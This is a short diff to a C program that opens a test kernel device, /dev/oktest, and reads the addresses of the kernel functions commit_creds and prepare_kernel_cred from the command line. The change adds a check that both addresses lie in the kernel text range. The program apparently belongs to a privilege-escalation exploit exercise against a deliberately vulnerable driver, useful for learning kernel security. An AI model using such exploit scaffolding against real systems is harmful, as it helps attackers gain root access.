@@ -18,6 +18,13 @@
 #define DEVICE_NAME "oktest"
 #define DEVICE_PATH "/dev/oktest"
 
+/*
+ * The beginning and end of the kernel text region taken from
+ * ./Documentation/x86/x86_64/mm.txt 
+ */
+#define START_KTEXT 0xffffffff80000000UL
+#define END_KTEXT   0xffffffff9fffffffUL
+
 #define MAGIC_NO '4'
 static int count = 0;
 static unsigned long commit_cred = 0xffffffffad0a4010;
@@ -91,6 +98,14 @@ void usage(char *c)
 	exit(-1);
 }
 
+void check_address(unsigned long a, char *c)
+{
+	if (a < START_KTEXT || a > END_KTEXT) {
+		printf("%#lx outside of kernel text address range\n", a);
+		usage(c);
+	}
+}
+
 int main(int argc, char **argv)
 {
 	int fd;
@@ -100,6 +115,8 @@ int main(int argc, char **argv)
 		usage(argv[0]);
 	commit_cred = strtoul(argv[1], &p, 16);
 	prepare_kernel_cred = strtoul(argv[2], &p, 16);
+	check_address(commit_cred, argv[0]);
+	check_address(prepare_kernel_cred, argv[0]);
 	
 	if((fd = open(DEVICE_PATH, O_RDWR)) == -1 ){
 		printf("Failed to open (%s) errno (%d)\n", DEVICE_PATH, errno);
